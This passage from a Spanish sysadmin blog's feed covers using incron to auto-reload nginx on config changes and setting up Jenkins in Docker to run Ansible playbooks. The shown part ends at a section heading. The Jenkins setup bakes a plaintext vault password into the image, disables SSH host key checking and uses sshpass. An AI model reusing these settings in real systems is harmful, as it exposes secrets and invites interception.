&lt;li&gt;&lt;strong&gt;incron -r&lt;/strong&gt; &amp;rarr; elimina la tabla de incron del usuario actual&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para usar &lt;strong&gt;incron&lt;/strong&gt; a nivel de usuario, este debe aparecer en &lt;em&gt;/etc/incron.allow&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un caso práctico&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor web &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:/etc/nginx/sites-enabled# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:80              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;249&lt;/span&gt;/nginx       
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@65b056d5d699:/etc/nginx/sites-enabled# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estamos cansados de recargar la configuración cada vez que modificamos alguno de los ficheros de configuración, así que vamos a delegar esta tarea a &lt;strong&gt;incron&lt;/strong&gt;. Concretamente queremos que cada vez que se modifique el fichero &lt;em&gt;/etc/nginx/nginx.conf&lt;/em&gt; o algunos de los &lt;em&gt;virtualhosts&lt;/em&gt; en &lt;em&gt;/etc/nginx/sites-enabled/&lt;/em&gt;, se haga un &lt;em&gt;reload&lt;/em&gt; del servicio.&lt;/p&gt;
&lt;p&gt;Miramos la tabla de eventos posibles a monitorizar y vemos que nos interesa el evento &lt;strong&gt;IN_MODIFY&lt;/strong&gt;. Se pueden monitorizar varios eventos uniéndolos con un &lt;strong&gt;OR&lt;/strong&gt; lógico, pero no se pueden poner mas de una línea por carpeta monitorizada.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;IN_ACCESS&lt;/strong&gt; &amp;rarr; Se ha accedido al fichero o directorio.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_ATTRIB&lt;/strong&gt; &amp;rarr; Se han cambiado los &lt;em&gt;metadatos&lt;/em&gt; (o los &lt;em&gt;timestamps&lt;/em&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_CLOSE_WRITE&lt;/strong&gt; &amp;rarr; Se ha cerrado un fichero abierto en modo distinto al de escritura.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_CLOSE_NOWRITE&lt;/strong&gt; &amp;rarr; Se ha cerrado un fichero abierto en modo de escritura.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_CREATE&lt;/strong&gt; &amp;rarr; Se ha creado un fichero en el directorio monitorizado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_DELETE&lt;/strong&gt; &amp;rarr; Se ha borrado un fichero en la carpeta.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_DELETE_SELF&lt;/strong&gt; &amp;rarr; El fichero o directorio monitorizado ha sido borrado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_MODIFY&lt;/strong&gt; &amp;rarr; El fichero ha sido modificado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_MOVE_SELF&lt;/strong&gt; &amp;rarr; El fichero o carpeta monitorizado se ha movido.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_MOVED_FROM&lt;/strong&gt; &amp;rarr; Un fichero se ha movido desde la carpeta monitorizada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_MOVED_TO&lt;/strong&gt; &amp;rarr; Un fichero se ha movido hacia la carpeta monitorizada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_OPEN&lt;/strong&gt; &amp;rarr; Se ha abierto un fichero en la carpeta monitorizada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_MOVE&lt;/strong&gt; &amp;rarr; Combinación de IN_MOVED_FROM y de IN_MOVED_TO.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_CLOSE&lt;/strong&gt; &amp;rarr; Combinación de IN_CLOSE_WRITE y IN_CLOSE_NOWRITE.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IN_ALL_EVENTS&lt;/strong&gt; &amp;rarr; Todos los eventos anteriores.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, ponemos la tripleta &lt;em&gt;carpeta, evento, acción&lt;/em&gt;, ya sea con el comando &lt;em&gt;incron -e&lt;/em&gt; o mediante un fichero en &lt;em&gt;/etc/incron.d/&lt;/em&gt;. Es importante indicar que la salida del comando no se puede recoger en este fichero; si es necesario, habría que llamar a un &lt;em&gt;script&lt;/em&gt; que tuviera la redirección.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# cat /etc/incron.d/nginx 
/etc/nginx/nginx.conf IN_MODIFY /usr/sbin/service nginx reload
/etc/nginx/sites-enabled/ IN_MODIFY /usr/sbin/service nginx reload
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto no hay que recargar nada; &lt;strong&gt;incron&lt;/strong&gt; ha detectado el cambio y se ha recargado solo.&lt;/p&gt;
&lt;p&gt;Vamos a cambiar, por ejemplo, el puerto en el que escucha nuestra web.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ANTES:&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# cat /etc/nginx/sites-enabled/mysite 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt; default_server&lt;span class="p"&gt;;&lt;/span&gt;
    root /var/www/html&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;DESPUES:&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# cat /etc/nginx/sites-enabled/mysite 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;8080&lt;/span&gt; default_server&lt;span class="p"&gt;;&lt;/span&gt;
    root /var/www/html&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y sin recargar la configuración de &lt;strong&gt;nginx&lt;/strong&gt; -puesto que ya lo ha hecho &lt;strong&gt;incron&lt;/strong&gt;-, vemos que se ha puesto a escuchar en el nuevo puerto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080            &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;249&lt;/span&gt;/nginx       
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ejecución parametrizada de nuestras tareas&lt;/h2&gt;
&lt;p&gt;El proceso de &lt;strong&gt;incron&lt;/strong&gt; nos ofrece unos parámetros para discernir cual de los eventos disparó el &lt;em&gt;trigger&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;$$&lt;/strong&gt; &amp;rarr; Símbolo de dólar.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$@&lt;/strong&gt; &amp;rarr; Ruta de la carpeta monitorizada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$#&lt;/strong&gt; &amp;rarr; Fichero modificado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$%&lt;/strong&gt; &amp;rarr; Evento que disparó la acción, en texto.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$&amp;amp;&lt;/strong&gt; &amp;rarr; Evento que disparó la acción, en número.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Si quisiéramos procesar un fichero tal como nos lo dejen en una carpeta, podemos usar un &lt;em&gt;script&lt;/em&gt; con parámetros que haga lo que deba con el mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@65b056d5d699:~# cat /etc/incron.d/batch_process 
/opt/batch_process/inbox/ IN_WRITE_CLOSE /opt/batch_process/process_file.py &lt;span class="nv"&gt;$@&lt;/span&gt; &lt;span class="nv"&gt;$#&lt;/span&gt;
root@65b056d5d699:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este &lt;em&gt;script&lt;/em&gt; recibe la ruta de la carpeta monitorizada y el fichero. Lo que hace el &lt;em&gt;script&lt;/em&gt; se deja a la imaginación del lector. Como punto adicional, recalcar que se ha usado el evento &lt;strong&gt;IN_WRITE_CLOSE&lt;/strong&gt; en vez de &lt;strong&gt;IN_CREATE&lt;/strong&gt; porque este último salta inmediatamente, y podríamos encontrarnos con un fichero a medio subir, en caso de ser puesto por un protocolo remoto.&lt;/p&gt;
&lt;p&gt;Estoy seguro que en un futuro no muy lejano, esta herramienta me va a ser de gran utilidad.&lt;/p&gt;</content><category term="incron"></category></entry><entry><title>Lanzando playbooks de Ansible desde Jenkins</title><link href="http://www.linuxsysadmin.ml/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html" rel="alternate"></link><published>2016-09-26T08:00:00+02:00</published><updated>2016-09-26T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-26:/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html</id><summary type="html">&lt;p&gt;Somos muchos los amantes del terminal para ejecutar nuestras tareas, sea con &lt;strong&gt;Ansible&lt;/strong&gt; o con otras herramientas. A veces nos puede convenir dotar la herramienta de un entorno gráfico o web para que lo hagan otras personas. Aunque ya existe como producto &lt;strong&gt;Ansible Tower&lt;/strong&gt;, su precio es prohibitivo para muchos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Somos muchos los amantes del terminal para ejecutar nuestras tareas, sea con &lt;strong&gt;Ansible&lt;/strong&gt; o con otras herramientas. A veces nos puede convenir dotar la herramienta de un entorno gráfico o web para que lo hagan otras personas. Aunque ya existe como producto &lt;strong&gt;Ansible Tower&lt;/strong&gt;, su precio es prohibitivo para muchos.&lt;/p&gt;
&lt;p&gt;Desarrollar una solución propia no suele ser una opción viable, pero afortunadamente, hay muchas soluciones que pueden satisfacer nuestras necesidades. Una de ellas es &lt;strong&gt;Jenkins&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En este tutorial y, por comodidad, nos vamos a ahorrar la instalación de &lt;strong&gt;Jenkins&lt;/strong&gt; usando la imagen oficial para &lt;strong&gt;Docker&lt;/strong&gt;. Sobre esta imagen vamos a añadir aquello que podamos necesitar para lanzar nuestros &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a adoptar un modelo de trabajo en el que nuestro inventario y nuestros &lt;em&gt;playbooks&lt;/em&gt; están alojados en un servidor &lt;strong&gt;git&lt;/strong&gt;. Nuestro &lt;strong&gt;Jenkins&lt;/strong&gt; va a descargarse este repositorio como "fuente" de código y va a "construir" ejecutando los &lt;em&gt;playbooks&lt;/em&gt; del repositorio.&lt;/p&gt;
&lt;h2&gt;Preparando nuestro contenedor&lt;/h2&gt;
&lt;p&gt;Vamos a empezar por un &lt;em&gt;Dockerfile&lt;/em&gt; que parte de la imagen oficial de &lt;strong&gt;Jenkins&lt;/strong&gt;. A esa imagen habría que añadir &lt;strong&gt;Ansible&lt;/strong&gt;, el cliente de &lt;strong&gt;SSH&lt;/strong&gt; necesario por &lt;strong&gt;Ansible&lt;/strong&gt; y el paquete &lt;strong&gt;sshpass&lt;/strong&gt; para que pueda entrar en las máquinas usando autenticación tradicional de usuario y contraseña. El cliente de &lt;strong&gt;git&lt;/strong&gt; ya viene en la imagen base.&lt;/p&gt;
&lt;p&gt;Vamos a poner también en esta imagen una configuración de &lt;strong&gt;Ansible&lt;/strong&gt; para el usuario &lt;em&gt;jenkins&lt;/em&gt; que levanta la web, y el fichero con la contraseña de los &lt;em&gt;vaults&lt;/em&gt;; de esta forma podemos versionar los fichero &lt;em&gt;vault&lt;/em&gt; sin miedo a que se puedan descifrar si alguien obtiene una copia de nuestro repositorio.&lt;/p&gt;
&lt;p&gt;Así nos quedaría el &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ cat Dockerfile 
FROM jenkins
USER root
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://ftp.debian.org/debian jessie-backports main&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/backports.list &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y openssh-client sshpass &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y -t jessie-backports ansible &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get clean &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
ADD ansible.cfg /var/jenkins_home/.ansible.cfg
ADD vault-passfile /var/jenkins_home/.vault-passfile
USER jenkins
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y los ficheros auxiliares:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ cat ansible.cfg 
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;vault_password_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /var/jenkins_home/.vault-passfile
gerard@seginus:~/docker/jenkins_ansible$ cat vault-passfile 
5up3r53cr37
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos nuestra nueva imagen con las herramientas necesarias, con el comando habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker build -t jenkins_ansible .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM jenkins
 ---&amp;gt; 2da1d8d90b7e
Step &lt;span class="m"&gt;2&lt;/span&gt; : USER root
 ---&amp;gt; Running in f994443d27bd
 ---&amp;gt; 18e3df2ad21f
Removing intermediate container f994443d27bd
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://ftp.debian.org/debian jessie-backports main&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/backports.list &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y openssh-client sshpass &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y -t jessie-backports ansible &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get clean &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     rm -rf /var/lib/apt/lists/*
 ---&amp;gt; Running in 2c3371ad61b0
Get:1 http://security.debian.org jessie/updates InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;63&lt;/span&gt;.1 kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:2 http://ftp.debian.org jessie-backports InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;166&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:3 http://security.debian.org jessie/updates/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;389&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:4 http://ftp.debian.org jessie-backports/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;879&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Ign http://httpredir.debian.org jessie InRelease
Get:5 http://httpredir.debian.org jessie-updates InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;142&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:6 http://httpredir.debian.org jessie-backports InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;166&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:7 http://httpredir.debian.org jessie Release.gpg &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2373&lt;/span&gt; B&lt;span class="o"&gt;]&lt;/span&gt;
Get:8 http://httpredir.debian.org jessie Release &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;148&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:9 http://httpredir.debian.org jessie-updates/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;.6 kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:10 http://httpredir.debian.org jessie/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;9032&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:11 http://httpredir.debian.org jessie-backports/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;879&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Fetched &lt;span class="m"&gt;11&lt;/span&gt;.9 MB in 19s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;606&lt;/span&gt; kB/s&lt;span class="o"&gt;)&lt;/span&gt;
Reading package lists...
Reading package lists...
Building dependency tree...
Reading state information...
openssh-client is already the newest version.
The following NEW packages will be installed:
  sshpass
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;1&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;1&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;11&lt;/span&gt;.2 kB of archives.
After this operation, &lt;span class="m"&gt;65&lt;/span&gt;.5 kB of additional disk space will be used.
Get:1 http://httpredir.debian.org/debian/ jessie/main sshpass amd64 &lt;span class="m"&gt;1&lt;/span&gt;.05-1 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;.2 kB&lt;span class="o"&gt;]&lt;/span&gt;
debconf: delaying package configuration, since apt-utils is not installed
Fetched &lt;span class="m"&gt;11&lt;/span&gt;.2 kB in 0s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;35&lt;/span&gt;.3 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
Selecting previously unselected package sshpass.
&lt;span class="o"&gt;(&lt;/span&gt;Reading database ... &lt;span class="m"&gt;17572&lt;/span&gt; files and directories currently installed.&lt;span class="o"&gt;)&lt;/span&gt;
Preparing to unpack .../sshpass_1.05-1_amd64.deb ...
Unpacking sshpass &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.05-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Setting up sshpass &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.05-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Reading package lists...
Building dependency tree...
Reading state information...
The following extra packages will be installed:
  ieee-data libyaml-0-2 python-crypto python-ecdsa python-httplib2
  python-jinja2 python-markupsafe python-netaddr python-paramiko
  python-pkg-resources python-selinux python-yaml
Suggested packages:
  python-crypto-dbg python-crypto-doc python-jinja2-doc ipython
  python-netaddr-docs python-setuptools
The following NEW packages will be installed:
  ansible ieee-data libyaml-0-2 python-crypto python-ecdsa python-httplib2
  python-jinja2 python-markupsafe python-netaddr python-paramiko
  python-pkg-resources python-selinux python-yaml
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;13&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;27&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;3359&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;19&lt;/span&gt;.5 MB of additional disk space will be used.
...  
 ---&amp;gt; d8ed3d7ffdb3
Removing intermediate container 2c3371ad61b0
Step &lt;span class="m"&gt;4&lt;/span&gt; : ADD ansible.cfg /var/jenkins_home/.ansible.cfg
 ---&amp;gt; cd63da025c0a
Removing intermediate container fe8b889557ae
Step &lt;span class="m"&gt;5&lt;/span&gt; : ADD vault-passfile /var/jenkins_home/.vault-passfile
 ---&amp;gt; 6cb532911067
Removing intermediate container bc522e9f464a
Step &lt;span class="m"&gt;6&lt;/span&gt; : USER jenkins
 ---&amp;gt; Running in 6c0f9cde92e5
 ---&amp;gt; 89e5cae2d376
Removing intermediate container 6c0f9cde92e5
Successfully built 89e5cae2d376
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos un contenedor para la nueva imagen creada, de la misma forma que levantaríamos la imagen de &lt;strong&gt;Jenkins&lt;/strong&gt; oficial. Mas información en &lt;a href="https://hub.docker.com/_/jenkins/"&gt;Docker Hub&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker run -p &lt;span class="m"&gt;8080&lt;/span&gt;:8080 -d jenkins_ansible
f9b6a9d23fde25411cd2086d13b7a171633eb2cf0b18295fde89c4466c08ef54
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya de paso, levantamos otras 4 máquinas como las que se indican en &lt;a href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt; para que ejecuten nuestros &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
ae3f8fe7d4448566c3481069d6c85d74ea3c6df7b9506c3f86e271247f5cbc52
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
c27f99a68d0e4a5d5d9897d3971f6a230c10ee44239bce2deb85a2e6e31e6536
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
0d33995bacf4d266f4f1bb2afc86a92b586be569ca10b1584bf48c5aed6b1277
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
221ae5b4c1cfe171530d5d9e9663222292da72144fdf2f62589acc50b72f3f2e
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Configurando nuestro Jenkins&lt;/h2&gt;
&lt;p&gt;Ya podemos abrir la página de nuestro contenedor, de forma que se puedan efectuar las configuraciones iniciales. Nos vamos a dirigir a &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;, que es desde donde se va a controlar nuestro servidor de ahora en adelante.&lt;/p&gt;
&lt;p&gt;La parte mas importante de nuestro despliegue de &lt;strong&gt;Jenkins&lt;/strong&gt; son los &lt;em&gt;plugins&lt;/em&gt;. En nuestro caso, solo queremos clonar nuestros &lt;em&gt;playbooks&lt;/em&gt; desde &lt;strong&gt;git&lt;/strong&gt; y lanzarlos mediante &lt;strong&gt;Ansible&lt;/strong&gt;. Para ello necesitamos estos dos &lt;em&gt;plugins&lt;/em&gt;: &lt;em&gt;git plugin&lt;/em&gt; y &lt;em&gt;ansible plugin&lt;/em&gt;. Se pueden instalar en la primera visita a nuestro contenedor o a &lt;em&gt;posteriori&lt;/em&gt;. Los instalamos.&lt;/p&gt;
&lt;p&gt;Y finalmente tenemos un &lt;strong&gt;Jenkins&lt;/strong&gt; funcional aunque si ninguna tarea configurada.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 01" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_01.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;El repositorio de playbooks&lt;/h2&gt;
&lt;p&gt;Necesitamos algún lugar desde donde obtener nuestros &lt;em&gt;playbooks&lt;/em&gt;. De acuerdo con la decisión del flujo de trabajo van a estar alojados en un servidor &lt;strong&gt;git&lt;/strong&gt;, y en este caso, voy a usar un repositorio de usar y tirar en &lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Por poner a nuestro repositorio alguna estructura, he usado dos carpetas: una para contener los &lt;em&gt;playbooks&lt;/em&gt; y otra para el inventario. La carpeta del inventario es similar a la de &lt;a href="http://www.linuxsysadmin.ml/2016/08/encriptando-datos-sensibles-con-ansible.html"&gt;este otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/ansible$ tree
.
├── inventory
│   ├── hosts
│   └── vault
└── playbooks
    ├── ping_all.yml
    └── ping_some.yml

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
gerard@seginus:~/docker/ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En &lt;em&gt;inventory/vault&lt;/em&gt; tenemos los datos de conexión a las máquinas, como indica el artículo antes citado. El resto de ficheros son los &lt;em&gt;playbooks&lt;/em&gt; que vamos a usar, y los &lt;em&gt;hosts&lt;/em&gt; que tenemos en sus grupos correspondientes. Hay que tirar de imaginación para imaginar un &lt;em&gt;playbook&lt;/em&gt; un poco mas útil.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/ansible$ cat inventory/hosts 
&lt;span class="o"&gt;[&lt;/span&gt;group1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4

&lt;span class="o"&gt;[&lt;/span&gt;group2&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.5
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.6
gerard@seginus:~/docker/ansible$ cat playbooks/ping_all.yml 
- hosts: all
  tasks:
    - ping:
gerard@seginus:~/docker/ansible$ cat playbooks/ping_some.yml 
- hosts: &lt;span class="s2"&gt;&amp;quot;{{ target }}&amp;quot;&lt;/span&gt;
  tasks:
    - ping:
gerard@seginus:~/docker/ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando una tarea básica&lt;/h2&gt;
